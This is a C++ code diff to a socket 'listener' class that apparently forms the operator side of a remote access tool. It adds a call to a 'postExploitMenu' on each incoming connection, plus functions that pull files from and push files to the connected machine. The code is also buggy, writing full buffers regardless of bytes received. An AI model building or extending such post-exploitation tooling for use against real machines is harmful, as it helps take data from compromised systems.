@@ -1,4 +1,6 @@
 #include "listener.h"
+#include "menus.h"
+#include <fstream>
 
 using namespace std;
 
@@ -83,13 +85,17 @@ void listener::test(int in){
 	if (new_fd == -1) {
 		cout<<"accepted error"<<endl;
 	}
+	cout << "Got connection" << endl;
 	inet_ntop(their_addr.ss_family, get_in_addr((struct sockaddr *)&their_addr), s, sizeof s);
+	postExploitMenu(this);
+	/*
 	int count=20;
 	while(count--){
 		cout<<"sneding"<<endl;
 		if(send(new_fd, "Hello, world!", 13, 0) == -1) perror("send");
 		sleep(1);
 	}
+	*/
 	close(sockfd);
 	close(new_fd);
 
@@ -97,4 +103,57 @@ void listener::test(int in){
 
 int listener::downloadFile() {
 	printf("Download File...\n");
+	ofstream out("test.txt", ios::binary);
+
+	send(new_fd, "download", 8, 0);
+			
+	while (out.is_open()) {
+		char *recvbuf = new char[1024];
+		int bytes = recv(new_fd, recvbuf, 1024, 0);
+
+		printf("Bytes is %d\n", bytes);
+		if (bytes > 0) {
+			printf("Writing to file\n");
+			out.write(recvbuf, 1024);
+			memset(recvbuf, '\0', 1024);
+		} else {
+			printf("Closing file error: %s\n", strerror(errno));
+			out.close();
+			break;
+		}
+
+		if (bytes < 1024) {
+			printf("Last section of file\n");
+			out.close();
+			break;
+		}
+	}
+	printf("Finished Downloading!");
+	//close(sockfd);
+	//close(new_fd);
+}
+
+int listener::uploadFile(string path) {
+	printf("Uploading File...\n");
+	std::streampos filesize = 0;
+	const char* FilePath = "test2.txt";
+	ifstream in(FilePath, std::ios::binary);
+	char* sendbuf = new char[1024];
+	int sendbuflen = 1024;
+	memset(sendbuf, '\0', sendbuflen);
+
+	while (in.is_open()) {
+		printf("File is open\n");
+		in.read(sendbuf, sendbuflen);
+		if (in.eof()) {
+			printf("End of file\n");
+			send(new_fd, sendbuf, sendbuflen, 0);
+			memset(sendbuf, '\0', sendbuflen);
+			in.close();
+		} else {
+			printf("Sending file\n");
+			send(new_fd, sendbuf, sendbuflen, 0);
+			memset(sendbuf, '\0', sendbuflen);
+		}
+	}
 }
